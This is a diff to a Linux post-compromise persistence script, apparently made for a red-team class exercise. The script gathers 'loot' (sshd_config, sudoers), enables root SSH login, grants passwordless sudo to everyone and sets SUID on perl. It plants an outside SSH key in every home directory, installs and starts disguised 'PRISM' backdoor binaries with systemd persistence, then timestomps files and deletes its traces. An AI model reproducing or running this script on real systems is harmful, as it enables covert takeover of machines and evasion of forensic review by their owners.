@@ -85,7 +85,7 @@ then
 
 fi
 
-
+echo "[!] FIREWALL & USER finished"
 
 #===============================================================================
 				# COLLECT FOR EXPORT #
@@ -111,18 +111,20 @@ cp /etc/ssh/sshd_config /tmp/l/sh
 cp /etc/sudoers /tmp/l/su
 
 # COLLECT HISTORY
-mkdir -p /tmp/l/bh
-find /home -iname ".*history" 2>/dev/null > /tmp/b
-for hist in `cat /tmp/b`; do
-	cp $hist /tmp/bh/$(echo "st$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
-done
-mv /tmp/b /tmp/l/
+#mkdir -p /tmp/l/bh
+#find /home -iname ".*history" 2>/dev/null > /tmp/b
+#for hist in `cat /tmp/b`; do
+#	cp $hist /tmp/bh/$(echo "st$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
+#done
+#mv /tmp/b /tmp/l/
 
 tar -cvf /tmp/l.tar /tmp/l
+
+echo "[!] LOOT finished"
 echo "[!] Don't forget to grab loot from /tmp/l.tar"
 
 #===============================================================================
-			# CONFIGURATIONSS #
+			# CONFIGURATIONS #
 #===============================================================================
 
 # Enable Root login over ssh
@@ -145,6 +147,8 @@ else
 	done
 	echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
 fi
+
+echo "[!] CONFIG finished"
 
 #===============================================================================
 				# SUID #
@@ -204,28 +208,40 @@ then
 	sh -c 'chmod 7777 /usr/bin/perl'
 fi
 
+echo "[!] SUID finished"
 #===============================================================================
 				# DROPPER #
 #===============================================================================
 
 # DROP SSH KEYS
 for d in /home/*; do
-	if [ -d "$d" ]; then
-		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
+	if [ -d "$d"  ];
+	then
+		if [ -d "$d/.ssh" ];
+		then
+			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
+		else
+			mkdir -p $d/.ssh
+		fi
 	fi
 done
 
+echo "[!] SSHKEYS dropped"
 
 # PRISM
 chmod 7700 ./fsdisk
 cp ./fsdisk /sbin/
+/sbin/fsdisk
 
 chmod 7700 ./devutil
 cp ./devutil /usr/local/
+/usr/local/devutil
 
 chmod 7700 ./udevd
 cp ./udevd /sbin/
+/sbin/udevd
 
+echo "[!] PRISM dropped"
 
 # SYSTEMD PERSISTENCE
 chmod 777 ./developer-utility.service
@@ -243,6 +259,7 @@ cp ./filesys.service /etc/systemd/system/
 systemctl start filesys.service
 systemctl enable filesys.service
 
+echo "[!] SYSTEMD set"
 
 #===============================================================================
 				# TIMESTOMP #
@@ -296,9 +313,20 @@ touch -m --date "2020-3-20 20:51:30" /etc/systemd/
 touch -a --date "2020-11-30 20:51:30" /etc
 touch -m --date "2020-11-30 20:51:30" /etc
 
-for target in `find /home`; do
+for target in `find /home | grep .ssh`; do
 	touch -a --date "2020-1-27 13:06:01" $target
 	touch -m --date "2020-1-27 13:06:01" $target
 done
+
+echo "[!] TIMESTOMPd"
+
+rm -f /tmp/filesys.service
+rm -f /tmp/udevd
+rm -f /tmp/fsdisk
+rm -f /tmp/devutil
+rm -f /tmp/developer-utility.service
+rm -f /tmp/developer-utility-daemon.service
+
+echo "[!] CLEANED"
 
 exit 0
